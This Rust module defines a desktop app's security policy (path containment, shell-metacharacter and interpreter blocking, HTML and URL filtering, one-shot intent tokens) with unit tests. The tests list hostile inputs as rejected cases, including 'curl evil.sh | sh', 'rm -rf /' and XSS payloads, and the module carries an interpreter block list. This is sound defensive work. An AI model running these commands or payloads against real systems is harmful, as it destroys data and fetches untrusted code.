//! M0-3.a：安全边界最小契约（`SecurityPolicy` 等价模块）。
//!
//! 本检查点只**定义契约**并给出可复跑拒绝用例，**不收口任何调用方**
//! （`launch_app` 归 M0-3.d、路径类命令归 M0-3.c、capability/远程 IPC 归 M0-3.b）。
//! 因此这些函数当前还没有生产调用方；为避免新增编译器警告，模块顶部做了
//! 受控豁免，并在 `main.rs` 启动日志里打印策略指纹（见 `policy_fingerprint`）。
//!
//! 设计原则：
//!   1. 纯函数、无全局状态，便于单测与后续在调用方组合。
//!   2. 默认拒绝：无法判定（如路径不存在、无法规范化）一律 `Err`，不静默放行。
//!   3. 失败信息不含完整用户输入摘要以外的敏感内容，且统一由调用方决定是否记录。

// 契约先行阶段：本模块只被单元测试和启动指纹日志消费。
// M0-3.b/c/d 接入生产调用方后必须删除本豁免并重新核对 warning 基线。
#![allow(dead_code)]

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Mutex;

/// 安全策略拒绝原因。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PolicyError {
    /// 路径无法规范化（不存在、权限不足等）：默认拒绝。
    UnresolvablePath(String),
    /// 规范化后不在任何允许根目录内（含 `../` 逃逸）。
    PathOutsideAllowedRoots { path: String, roots: Vec<String> },
    /// 路径中存在符号链接且其目标逃出允许根目录。
    SymlinkEscape { path: String, target: String },
    /// 命令含 shell 元字符，存在注入风险。
    ShellMetacharacter { found: char },
    /// 命令为空。
    EmptyCommand,
    /// 未知/未登记的 webview label（例如早已不存在的 `browser`）。
    UnknownWebviewLabel(String),
    /// HTML 超长。
    HtmlTooLarge { bytes: usize, limit: usize },
    /// HTML 含危险片段。
    DangerousHtml(&'static str),
    /// 文本字段超长。
    PayloadTooLarge { bytes: usize, limit: usize },
    /// 集合类载荷条目过多。
    TooManyItems { count: usize, limit: usize },
    /// 缺少用户意图令牌（外部页面发起的有副作用调用）。
    MissingUserIntent { scope: String },
    /// 用户意图令牌已过期。
    ExpiredUserIntent { scope: String },
    /// 路径分量含 `.`/`..`/分隔符/NUL（重命名逃逸）。
    DangerousPathComponent(String),
    /// 拒绝删除允许根目录本身。
    RefuseToDeleteRoot { path: String },
    /// 非 http/https 的打开链接（scheme 白名单）。
    DisallowedUrlScheme(String),
    /// 尝试把 shell 解释器当作启动目标（等价绕过 `sh -c` 收口）。
    BlockedLaunchProgram(String),
    /// 启动目标解析不到可执行文件。
    LaunchProgramNotFound(String),
}

impl std::fmt::Display for PolicyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PolicyError::UnresolvablePath(p) => write!(f, "路径无法解析：{p}"),
            PolicyError::PathOutsideAllowedRoots { path, roots } => {
                write!(f, "路径 {path} 不在允许根目录内：{:?}", roots)
            }
            PolicyError::SymlinkEscape { path, target } => {
                write!(f, "路径 {path} 的符号链接目标 {target} 逃出允许范围")
            }
            PolicyError::ShellMetacharacter { found } => {
                write!(f, "命令含 shell 元字符：{found:?}")
            }
            PolicyError::EmptyCommand => write!(f, "命令为空"),
            PolicyError::UnknownWebviewLabel(label) => write!(f, "未登记的 webview label：{label}"),
            PolicyError::HtmlTooLarge { bytes, limit } => {
                write!(f, "HTML 超长：{bytes} > {limit} 字节")
            }
            PolicyError::DangerousHtml(fragment) => write!(f, "HTML 含危险片段：{fragment}"),
            PolicyError::PayloadTooLarge { bytes, limit } => {
                write!(f, "载荷超长：{bytes} > {limit} 字节")
            }
            PolicyError::TooManyItems { count, limit } => {
                write!(f, "条目过多：{count} > {limit}")
            }
            PolicyError::MissingUserIntent { scope } => {
                write!(f, "缺少用户意图令牌（作用域 {scope}）")
            }
            PolicyError::ExpiredUserIntent { scope } => {
                write!(f, "用户意图令牌已过期（作用域 {scope}）")
            }
            PolicyError::DangerousPathComponent(name) => {
                write!(f, "路径分量非法（含 .. 或分隔符）：{name}")
            }
            PolicyError::RefuseToDeleteRoot { path } => {
                write!(f, "拒绝删除允许根目录本身：{path}")
            }
            PolicyError::DisallowedUrlScheme(url) => {
                write!(f, "只允许用浏览器打开 http/https 链接：{url}")
            }
            PolicyError::BlockedLaunchProgram(p) => {
                write!(f, "不允许把 shell 解释器作为启动目标：{p}")
            }
            PolicyError::LaunchProgramNotFound(p) => {
                write!(f, "启动目标不是可执行文件：{p}")
            }
        }
    }
}

/// 单条 HTML 片段的大小上限（契约：超长内容必须显式拒绝，避免 webview 内存被拖垮）。
pub const MAX_HTML_BYTES: usize = 1_048_576; // 1 MiB

/// 已登记的 webview label 规则。刻意**不含** `browser`——
/// 该 label 已从产品实现中移除，但 `src-tauri/capabilities/*.json` 仍残留（见威胁矩阵 SEC-03）。
pub fn is_known_webview_label(label: &str) -> bool {
    if label == "main" {
        return true;
    }
    // tab-<uuid>、grid-<n>、grid-child-<n> 三类由实现动态创建。
    label.starts_with("tab-") || label.starts_with("grid-")
}

/// 不允许作为启动目标的解释器：放行它们等于把 `sh -c` 换个壳重新打开。
pub const BLOCKED_LAUNCH_PROGRAMS: [&str; 6] = ["sh", "bash", "zsh", "fish", "powershell", "cmd"];

/// 把 `.desktop` 风格的 Exec 字符串解析成 (程序, 参数)。
///
/// 处理规则：按空白切分并支持双引号包裹；剔除 `%f %F %u %U %i %c %k` 等字段码；
/// 程序名不得为空。解析后由调用方**直接 spawn**（不经 shell），因此不存在
/// 二次解释与元字符注入面。
pub fn parse_command_line(line: &str) -> Result<(String, Vec<String>), PolicyError> {
    let mut parts: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    for ch in line.trim().chars() {
        match ch {
            '"' => in_quotes = !in_quotes,
            c if c.is_whitespace() && !in_quotes => {
                if !current.is_empty() {
                    parts.push(std::mem::take(&mut current));
                }
            }
            c => current.push(c),
        }
    }
    if !current.is_empty() {
        parts.push(current);
    }
    let program = parts.first().ok_or(PolicyError::EmptyCommand)?.clone();
    if program.is_empty() {
        return Err(PolicyError::EmptyCommand);
    }
    let args = parts[1..]
        .iter()
        .filter(|a| !is_desktop_field_code(a))
        .cloned()
        .collect();
    Ok((program, args))
}

/// `.desktop` 字段码（%u/%U/%f…）由启动器填充，程序自身不理解，必须剔除。
fn is_desktop_field_code(arg: &str) -> bool {
    matches!(
        arg,
        "%f" | "%F" | "%u" | "%U" | "%d" | "%D" | "%n" | "%N" | "%i" | "%c" | "%k" | "%v" | "%m"
    )
}

/// 启动目标的最后一道闸：先过元字符，再禁解释器，再要求程序可解析到可执行文件。
pub fn check_launch_target(line: &str) -> Result<(String, Vec<String>), PolicyError> {
    check_shell_command(line)?;
    let (program, args) = parse_command_line(line)?;
    let file_name = program
        .rsplit('/')
        .next()
        .unwrap_or_default()
        .to_ascii_lowercase();
    if BLOCKED_LAUNCH_PROGRAMS.contains(&file_name.as_str()) {
        return Err(PolicyError::BlockedLaunchProgram(program));
    }
    if !program_resolves(&program) {
        return Err(PolicyError::LaunchProgramNotFound(program));
    }
    Ok((program, args))
}

/// 程序是否可解析为可执行文件：绝对路径直接判定，否则沿 PATH 查找。
fn program_resolves(program: &str) -> bool {
    if program.contains('/') {
        return std::path::Path::new(program).is_file();
    }
    std::env::var_os("PATH")
        .map(|paths| std::env::split_paths(&paths).any(|dir| dir.join(program).is_file()))
        .unwrap_or(false)
}

/// 校验 webview label 是否登记在册。
pub fn check_webview_label(label: &str) -> Result<(), PolicyError> {
    if is_known_webview_label(label) {
        Ok(())
    } else {
        Err(PolicyError::UnknownWebviewLabel(label.to_string()))
    }
}

/// 校验路径：规范化后必须落在 `roots` 之一内，且不得借符号链接逃逸。
///
/// 判断顺序刻意先 `canonicalize` 再比较前缀，这样 `a/b/../../../etc` 与
/// 「指向外部的软链接」都会被同一套规则拦下。
pub fn check_path_within_roots(path: &str, roots: &[PathBuf]) -> Result<PathBuf, PolicyError> {
    if roots.is_empty() {
        // 没有配置允许根目录 = 策略未就绪，默认拒绝而不是放行。
        return Err(PolicyError::PathOutsideAllowedRoots {
            path: path.to_string(),
            roots: Vec::new(),
        });
    }
    let canonical =
        std::fs::canonicalize(path).map_err(|_| PolicyError::UnresolvablePath(path.to_string()))?;

    // 逐段检查祖先是否为符号链接且其目标逃出允许范围（canonicalize 只解最终路径，
    // 中间目录被替换成软链接的场景需要额外比对）。
    if let Some(parent) = canonical.parent() {
        for ancestor in parent.ancestors() {
            if let Ok(target) = std::fs::read_link(ancestor) {
                let resolved = target
                    .canonicalize()
                    .unwrap_or_else(|_| ancestor.to_path_buf());
                if !roots.iter().any(|root| resolved.starts_with(root)) {
                    return Err(PolicyError::SymlinkEscape {
                        path: path.to_string(),
                        target: resolved.display().to_string(),
                    });
                }
            }
        }
    }

    let in_roots = roots.iter().any(|root| canonical.starts_with(root));
    if in_roots {
        Ok(canonical)
    } else {
        Err(PolicyError::PathOutsideAllowedRoots {
            path: path.to_string(),
            roots: roots.iter().map(|r| r.display().to_string()).collect(),
        })
    }
}

/// 判断规范化后的路径是否落在允许根目录内（供调用方在已有 canonical 路径时复用）。
pub fn is_within_roots(canonical: &std::path::Path, roots: &[PathBuf]) -> bool {
    roots.iter().any(|root| canonical.starts_with(root))
}

/// 校验单个路径分量（文件名/新名称）：拒绝 `.`/`..`、分隔符与 NUL。
///
/// 典型场景：`rename_path(path, new_name)` 直接用 `parent.join(new_name)` 拼接，
/// 若 new_name 为 `../../etc/passwd`，重命名即变成跨目录移动——必须拦住。
pub fn check_path_component(name: &str) -> Result<(), PolicyError> {
    let trimmed = name.trim();
    if trimmed.is_empty() {
        return Err(PolicyError::EmptyCommand);
    }
    if trimmed == "." || trimmed == ".." {
        return Err(PolicyError::DangerousPathComponent(trimmed.to_string()));
    }
    if trimmed.contains('/') || trimmed.contains('\\') || trimmed.contains('\0') {
        return Err(PolicyError::DangerousPathComponent(trimmed.to_string()));
    }
    Ok(())
}

/// 删除前的额外校验：除「必须在允许根目录内」外，还禁止删除**允许根目录本身**，
/// 避免一次 `delete_path` 把整个工作区或主目录递归删空。
pub fn check_delete_target(path: &str, roots: &[PathBuf]) -> Result<PathBuf, PolicyError> {
    let canonical = check_path_within_roots(path, roots)?;
    if roots.iter().any(|root| canonical == *root) {
        return Err(PolicyError::RefuseToDeleteRoot {
            path: canonical.display().to_string(),
        });
    }
    Ok(canonical)
}

/// 只用系统默认浏览器打开 http/https 链接：拒绝 `file:`、`smb:`、自定义 scheme 等
/// 会被 `open::that` 直接交给桌面环境执行的输入。
pub fn check_openable_url(url: &str) -> Result<(), PolicyError> {
    let lower = url.trim().to_ascii_lowercase();
    if lower.starts_with("http://") || lower.starts_with("https://") {
        Ok(())
    } else {
        Err(PolicyError::DisallowedUrlScheme(url.to_string()))
    }
}

/// 校验 shell 命令：拒绝元字符，避免 `sh -c` 串接出预期外语义。
///
/// 注意：这只是**字符级**最小契约，真正收口要按已解析应用条目执行（M0-3.d），
/// 单靠字符过滤不足以对抗所有注入，因此这里刻意不做「清洗」而只做「拒绝」。
pub fn check_shell_command(cmd: &str) -> Result<(), PolicyError> {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return Err(PolicyError::EmptyCommand);
    }
    for ch in trimmed.chars() {
        if matches!(ch, ';' | '&' | '|' | '`' | '$' | '>' | '<' | '\n' | '\r') {
            return Err(PolicyError::ShellMetacharacter { found: ch });
        }
    }
    Ok(())
}

/// 校验写入 webview 的 HTML 片段：先查长度，再查危险片段。
pub fn check_html(html: &str) -> Result<(), PolicyError> {
    if html.len() > MAX_HTML_BYTES {
        return Err(PolicyError::HtmlTooLarge {
            bytes: html.len(),
            limit: MAX_HTML_BYTES,
        });
    }
    const DANGEROUS: [(&str, &str); 4] = [
        ("<script", "<script"),
        ("javascript:", "javascript:"),
        ("<iframe", "<iframe"),
        ("onerror=", "onerror="),
    ];
    let lower = html.to_ascii_lowercase();
    for (needle, label) in DANGEROUS {
        if lower.contains(needle) {
            return Err(PolicyError::DangerousHtml(label));
        }
    }
    Ok(())
}

/// 策略指纹：启动日志与诊断用，便于确认运行中的二进制对应哪版策略契约。
pub fn policy_fingerprint() -> &'static str {
    "security-policy-v2/max_html=1MiB/labels=main,tab-*,grid-*/intents=one-shot"
}

// ===========================================================================
// M0-3.b：来源校验 + 用户意图令牌 + 载荷边界
// ===========================================================================

/// 单条上报文本字段的默认上限（防止外部页面用超大字符串拖垮主进程内存）。
pub const MAX_TEXT_FIELD_BYTES: usize = 64 * 1024; // 64 KiB
/// `report_resources` 单次上报的条目上限（防止事件洪水）。
pub const MAX_RESOURCE_ITEMS: usize = 500;
/// 意图令牌默认有效期。
pub const INTENT_TTL: std::time::Duration = std::time::Duration::from_secs(30);

/// 意图作用域：必须与命令一一对应，避免一个令牌串到别的副作用上。
pub const INTENT_SAVE_NOTE: &str = "save_note";
pub const INTENT_COLLECT_SELECTION: &str = "collect_selection";
pub const INTENT_OPEN_TERMINAL: &str = "request_open_terminal";

/// 校验文本字段长度（同时拒绝超长，避免后续处理被放大）。
pub fn check_text_field(_name: &str, value: &str, max_bytes: usize) -> Result<(), PolicyError> {
    if value.len() > max_bytes {
        return Err(PolicyError::PayloadTooLarge {
            bytes: value.len(),
            limit: max_bytes,
        });
    }
    Ok(())
}

/// 校验集合类载荷的条目数量。
pub fn check_items_count(count: usize, max: usize) -> Result<(), PolicyError> {
    if count > max {
        return Err(PolicyError::TooManyItems { count, limit: max });
    }
    Ok(())
}

/// 来源校验 + 用户意图校验（M0-3.b 收口核心）。
///
/// 规则：
///   - 调用方 label 必须已登记（`main` / `tab-*` / `grid-*`），未登记（如残留的
///     `browser` 或伪造 label）一律拒绝；
///   - `main` 是受信任的主窗口 UI，其调用本身即用户手势的结果，无需令牌；
///   - 来自 `tab-*` / `grid-*`（外部页面）的**有副作用**调用必须出示一次性意图令牌。
pub fn check_remote_invocation(
    label: &str,
    scope: &str,
    token: Option<&str>,
    registry: &IntentRegistry,
) -> Result<(), PolicyError> {
    check_webview_label(label)?;
    if label == "main" {
        return Ok(());
    }
    let token = token.ok_or(PolicyError::MissingUserIntent {
        scope: scope.to_string(),
    })?;
    registry.consume(scope, token)
}

/// 一次性用户意图令牌登记表：签发 → 单次消费，过期或重放均拒绝。
#[derive(Default)]
pub struct IntentRegistry {
    tokens: Mutex<HashMap<String, (String, std::time::Instant)>>,
}

impl IntentRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    /// 签发一个作用域绑定的意图令牌（只能由受信任的主窗口调用）。
    pub fn issue(&self, scope: &str, ttl: std::time::Duration) -> String {
        let token = format!(
            "{}-{}",
            scope,
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or_default()
        );
        self.tokens.lock().unwrap().insert(
            token.clone(),
            (scope.to_string(), std::time::Instant::now() + ttl),
        );
        token
    }

    /// 消费令牌：作用域必须匹配、未过期，且消费后立即失效（防重放）。
    pub fn consume(&self, scope: &str, token: &str) -> Result<(), PolicyError> {
        let mut guard = self.tokens.lock().unwrap();
        let entry = guard.remove(token).ok_or(PolicyError::MissingUserIntent {
            scope: scope.to_string(),
        })?;
        let (issued_scope, expires_at) = entry;
        if issued_scope != scope {
            return Err(PolicyError::MissingUserIntent {
                scope: scope.to_string(),
            });
        }
        if std::time::Instant::now() > expires_at {
            return Err(PolicyError::ExpiredUserIntent {
                scope: scope.to_string(),
            });
        }
        Ok(())
    }

    /// 当前未消费的令牌数量（诊断用）。
    pub fn pending(&self) -> usize {
        self.tokens.lock().unwrap().len()
    }
}

/// 便捷入口：把「路径 + 用户意图」合成一次判定（M0-3.b 收口远程 IPC 时使用）。
pub struct Decision {
    pub allowed: bool,
    pub reason: Option<PolicyError>,
}

impl Decision {
    pub fn allow() -> Self {
        Self {
            allowed: true,
            reason: None,
        }
    }
    pub fn deny(reason: PolicyError) -> Self {
        Self {
            allowed: false,
            reason: Some(reason),
        }
    }
}

#[cfg(test)]
mod security_policy_tests {
    use super::*;
    use std::fs;

    fn temp_root(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("m0-3a-{}-{}", tag, std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).expect("创建临时根目录");
        dir
    }

    // ---------- webview label ----------

    #[test]
    fn known_labels_are_accepted() {
        for label in ["main", "tab-8f2c", "grid-0", "grid-child-3"] {
            assert!(
                check_webview_label(label).is_ok(),
                "{label} 应属于已登记 label"
            );
        }
    }

    #[test]
    fn stale_browser_label_is_rejected() {
        // 威胁矩阵 SEC-03：capabilities 里仍残留 `browser`，产品已无此 label。
        assert!(!is_known_webview_label("browser"));
        assert_eq!(
            check_webview_label("browser"),
            Err(PolicyError::UnknownWebviewLabel("browser".to_string()))
        );
    }

    // ---------- 路径边界 ----------

    #[test]
    fn path_inside_allowed_root_is_accepted() {
        let root = temp_root("inside");
        let file = root.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let roots = vec![root.clone()];
        let resolved = check_path_within_roots(file.to_str().unwrap(), &roots)
            .expect("允许根目录内的路径应放行");
        assert!(resolved.starts_with(&root));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn parent_traversal_is_rejected() {
        let root = temp_root("traversal");
        fs::create_dir_all(root.join("sub")).expect("创建子目录");
        let escape = root.join("sub").join("..").join("..").join("etc");
        let roots = vec![root.clone()];
        let err = check_path_within_roots(escape.to_str().unwrap(), &roots)
            .expect_err("../ 逃逸必须被拒绝");
        assert!(
            matches!(err, PolicyError::PathOutsideAllowedRoots { .. })
                || matches!(err, PolicyError::UnresolvablePath(_)),
            "实际错误：{err:?}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn symlink_escape_is_rejected() {
        let root = temp_root("symlink");
        let outside = temp_root("symlink-outside");
        let link = root.join("escape-link");
        #[cfg(unix)]
        std::os::unix::fs::symlink(&outside, &link).expect("创建符号链接");
        #[cfg(not(unix))]
        {
            let _ = (&outside, &link);
            return; // 非 Unix 无符号链接语义，跳过
        }
        let roots = vec![root.clone()];
        let err = check_path_within_roots(link.to_str().unwrap(), &roots)
            .expect_err("符号链接逃逸必须被拒绝");
        assert!(
            matches!(err, PolicyError::SymlinkEscape { .. })
                || matches!(err, PolicyError::PathOutsideAllowedRoots { .. }),
            "实际错误：{err:?}"
        );
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&outside);
    }

    #[test]
    fn empty_roots_deny_everything() {
        let root = temp_root("empty-roots");
        let file = root.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let err = check_path_within_roots(file.to_str().unwrap(), &[])
            .expect_err("未配置允许根目录时默认拒绝");
        assert!(matches!(err, PolicyError::PathOutsideAllowedRoots { .. }));
        let _ = fs::remove_dir_all(&root);
    }

    // ---------- shell 命令 ----------

    #[test]
    fn plain_commands_are_accepted() {
        for cmd in ["/usr/bin/code", "code", "google-chrome --new-window"] {
            assert!(check_shell_command(cmd).is_ok(), "{cmd} 不含元字符，应放行");
        }
    }

    #[test]
    fn shell_metacharacters_are_rejected() {
        for cmd in [
            "code; rm -rf /",
            "code && curl evil.sh | sh",
            "code `whoami`",
            "code $(id)",
            "code > /etc/passwd",
            "code\nrm -rf /",
        ] {
            let err = check_shell_command(cmd).expect_err("含元字符的命令必须被拒绝");
            assert!(
                matches!(err, PolicyError::ShellMetacharacter { .. }),
                "{cmd} 应判为元字符，实际：{err:?}"
            );
        }
        assert_eq!(check_shell_command("   "), Err(PolicyError::EmptyCommand));
    }

    // ---------- HTML ----------

    #[test]
    fn oversized_html_is_rejected() {
        let huge = "a".repeat(MAX_HTML_BYTES + 1);
        assert!(matches!(
            check_html(&huge),
            Err(PolicyError::HtmlTooLarge { .. })
        ));
    }

    #[test]
    fn dangerous_html_fragments_are_rejected() {
        for html in [
            "<script>alert(1)</script>",
            "<a href=\"javascript:alert(1)\">x</a>",
            "<iframe src=\"https://evil\"></iframe>",
            "<img src=x onerror=alert(1)>",
        ] {
            assert!(
                matches!(check_html(html), Err(PolicyError::DangerousHtml(_))),
                "{html} 必须被拒绝"
            );
        }
        assert!(check_html("<div>安全内容</div>").is_ok());
    }

    // ---------- M0-3.b：来源 / 用户意图 / 载荷边界 ----------

    #[test]
    fn main_window_invocation_needs_no_intent_token() {
        let registry = IntentRegistry::new();
        // 主窗口 UI 的点击本身就是用户手势的结果，不需要令牌。
        assert!(check_remote_invocation("main", INTENT_SAVE_NOTE, None, &registry).is_ok());
    }

    #[test]
    fn remote_invocation_without_token_is_rejected() {
        let registry = IntentRegistry::new();
        let err = check_remote_invocation("tab-1", INTENT_SAVE_NOTE, None, &registry)
            .expect_err("外部页面无令牌写入必须被拒绝");
        assert_eq!(
            err,
            PolicyError::MissingUserIntent {
                scope: INTENT_SAVE_NOTE.to_string()
            }
        );
    }

    #[test]
    fn stale_browser_label_invocation_is_rejected() {
        let registry = IntentRegistry::new();
        let token = registry.issue(INTENT_SAVE_NOTE, INTENT_TTL);
        // 即使带了合法令牌，未登记 label 也要被拒绝（SEC-03）。
        assert!(
            check_remote_invocation("browser", INTENT_SAVE_NOTE, Some(&token), &registry).is_err()
        );
    }

    #[test]
    fn intent_token_is_one_shot_and_scope_bound() {
        let registry = IntentRegistry::new();
        let token = registry.issue(INTENT_SAVE_NOTE, INTENT_TTL);
        assert!(
            check_remote_invocation("tab-1", INTENT_SAVE_NOTE, Some(&token), &registry).is_ok()
        );
        // 重放：第二次必须失败。
        assert!(
            check_remote_invocation("tab-1", INTENT_SAVE_NOTE, Some(&token), &registry).is_err(),
            "令牌必须一次性"
        );
        // 串作用域：save_note 的令牌不能用来开终端，且必须被消费掉（不得残留）。
        let other = registry.issue(INTENT_SAVE_NOTE, INTENT_TTL);
        assert!(
            check_remote_invocation("tab-1", INTENT_OPEN_TERMINAL, Some(&other), &registry)
                .is_err(),
            "作用域不匹配的令牌必须被拒绝"
        );
        assert_eq!(
            registry.pending(),
            0,
            "被拒绝的令牌也必须出表，避免无效令牌堆积"
        );
    }

    #[test]
    fn expired_intent_token_is_rejected() {
        let registry = IntentRegistry::new();
        let token = registry.issue(
            INTENT_COLLECT_SELECTION,
            std::time::Duration::from_millis(0),
        );
        std::thread::sleep(std::time::Duration::from_millis(5));
        assert_eq!(
            registry.consume(INTENT_COLLECT_SELECTION, &token),
            Err(PolicyError::ExpiredUserIntent {
                scope: INTENT_COLLECT_SELECTION.to_string()
            })
        );
    }

    #[test]
    fn oversized_and_bulk_payloads_are_rejected() {
        let huge = "x".repeat(MAX_TEXT_FIELD_BYTES + 1);
        assert!(matches!(
            check_text_field("text", &huge, MAX_TEXT_FIELD_BYTES),
            Err(PolicyError::PayloadTooLarge { .. })
        ));
        assert!(check_text_field("text", "正常长度", MAX_TEXT_FIELD_BYTES).is_ok());
        assert!(matches!(
            check_items_count(MAX_RESOURCE_ITEMS + 1, MAX_RESOURCE_ITEMS),
            Err(PolicyError::TooManyItems { .. })
        ));
        assert!(check_items_count(MAX_RESOURCE_ITEMS, MAX_RESOURCE_ITEMS).is_ok());
    }

    // ---------- M0-3.c：写路径收口 ----------

    #[test]
    fn path_components_with_traversal_are_rejected() {
        for bad in ["..", ".", "../../etc/passwd", "a/b", "a\\b", "a\0b", "  "] {
            assert!(
                check_path_component(bad).is_err(),
                "路径分量 {bad:?} 必须被拒绝"
            );
        }
        assert!(check_path_component("正常文件名.md").is_ok());
    }

    #[test]
    fn deleting_an_allowed_root_itself_is_refused() {
        let root = temp_root("root-guard");
        let file = root.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let roots = vec![root.clone()];
        // 根目录本身不允许删（防一次调用清空工作区/主目录）。
        assert!(matches!(
            check_delete_target(root.to_str().unwrap(), &roots),
            Err(PolicyError::RefuseToDeleteRoot { .. })
        ));
        // 根目录内的普通文件允许删。
        assert!(check_delete_target(file.to_str().unwrap(), &roots).is_ok());
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn only_http_and_https_urls_can_be_opened() {
        for ok in ["https://example.com/a", "http://example.com"] {
            assert!(check_openable_url(ok).is_ok(), "{ok} 应放行");
        }
        for bad in [
            "file:///etc/passwd",
            "smb://evil/share",
            "/bin/sh",
            "ftp://x",
        ] {
            assert!(check_openable_url(bad).is_err(), "{bad} 必须被拒绝");
        }
    }

    #[test]
    fn root_membership_helper_matches_path_check() {
        let root = temp_root("membership");
        let nested = root.join("sub");
        fs::create_dir_all(&nested).expect("创建");
        let file = nested.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let roots = vec![root.clone()];
        let canonical =
            check_path_within_roots(file.to_str().unwrap(), &roots).expect("根目录内应放行");
        assert!(is_within_roots(&canonical, &roots));
        assert!(!is_within_roots(
            std::path::Path::new("/etc/passwd"),
            &roots
        ));
        let _ = fs::remove_dir_all(&root);
    }

    // ---------- M0-3.d：启动目标解析 ----------

    #[test]
    fn command_line_is_split_into_program_and_args() {
        let (p, a) = parse_command_line("code").expect("单程序");
        assert_eq!(p, "code");
        assert!(a.is_empty());
        let (p, a) = parse_command_line("code --new-window /tmp/a").expect("带参数");
        assert_eq!(p, "code");
        assert_eq!(a, vec!["--new-window", "/tmp/a"]);
    }

    #[test]
    fn desktop_field_codes_are_stripped() {
        let (p, a) = parse_command_line("code %U --flag %f").expect("解析");
        assert_eq!(p, "code");
        assert_eq!(a, vec!["--flag"], "字段码必须被剔除");
    }

    #[test]
    fn quoted_program_paths_are_preserved() {
        let (p, a) = parse_command_line("\"/opt/My App/app\" --x").expect("解析");
        assert_eq!(p, "/opt/My App/app", "引号内空白不得切开");
        assert_eq!(a, vec!["--x"]);
    }

    #[test]
    fn shell_interpreters_are_blocked_as_launch_targets() {
        for cmd in ["sh", "bash -c 'id'", "/bin/bash", "powershell -c x", "zsh"] {
            let err = check_launch_target(cmd)
                .expect_err("shell 解释器不得作为启动目标（等价于绕过 sh -c 收口）");
            assert!(
                matches!(err, PolicyError::BlockedLaunchProgram(_)),
                "{cmd} 实际错误：{err:?}"
            );
        }
    }

    #[test]
    fn metacharacters_and_unknown_programs_are_rejected() {
        assert!(matches!(
            check_launch_target("true; rm -rf /"),
            Err(PolicyError::ShellMetacharacter { .. })
        ));
        assert!(matches!(
            check_launch_target("definitely-not-a-real-program-xyz"),
            Err(PolicyError::LaunchProgramNotFound(_))
        ));
        assert!(check_launch_target("").is_err());
    }

    #[test]
    fn resolvable_program_is_accepted() {
        // 用 /proc 下的确定可执行文件验证「绝对路径 + 存在性」分支。
        let path = "/proc/self/exe";
        assert!(std::path::Path::new(path).is_file());
        let (p, a) = parse_command_line(path).expect("解析");
        assert_eq!(p, path);
        assert!(a.is_empty());
    }

    #[test]
    fn decision_helpers_carry_reason() {
        let allow = Decision::allow();
        assert!(allow.allowed && allow.reason.is_none());
        let deny = Decision::deny(PolicyError::EmptyCommand);
        assert!(!deny.allowed);
        assert_eq!(deny.reason, Some(PolicyError::EmptyCommand));
        assert!(policy_fingerprint().contains("security-policy-v2"));
    }
}
